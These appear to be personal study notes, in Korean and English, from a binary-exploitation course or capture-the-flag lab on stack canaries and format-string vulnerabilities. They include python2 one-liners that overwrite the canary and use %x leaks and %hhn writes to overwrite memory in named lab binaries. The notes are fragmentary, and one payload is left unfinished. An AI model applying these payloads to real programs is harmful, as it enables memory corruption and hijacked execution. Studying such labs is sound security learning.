Formats11

Canary

vulfoo has canary

argc 갯수
argv 어레이로된 parameter

fread

부모 프로세스- 아들 프로세스
Format string

Format 11_32

**카나리 찾는법**
1. Printf 에서 %x.으로 메모리 주소 읽기
	objdump -d - 디스어셈블
	

%eax,-0x2c(%ebp) 
ebp-20

0x8049276

python2 -c "print 'a'*20 + '\x00\x53\x5c\x59' + 'a'*12 + 

카나리를 잘 덮었어야되

SHELL CODE로 리턴하기 >


tmpbuffer
	RET
		%x %x.... %n
			Override = 4 bytes
				1 byte = %hhn Higer 4 bytes are same just lower 4 bytes
			$hhn$nx$hhn
			![[Screenshot 2024-10-31 at 3.37.55 PM.png]]
				python2 -c "print '\x8c\xd6\xff\xff'+'\x8d\xd6\xff\xff' + '%08x.'*8 + '%hhhn%hhn'" | ./formatstring_formats5_3
				8 Bytes+ 9bytes
				=62bytes
		4,4,4,10,58x

1. 하나의 정수는 4바이트
2. 하나의 HEX는 1 바이트
3. python2 -c "print '\x8c\xd6\xff\xff'+'aaaa'+'\x8d\xd6\xff\xff' + '%09x.'*5 + '%248x' +'%hhn%92d%hhn'" | ./formatstring_formats5_32 


formats9
3 global variables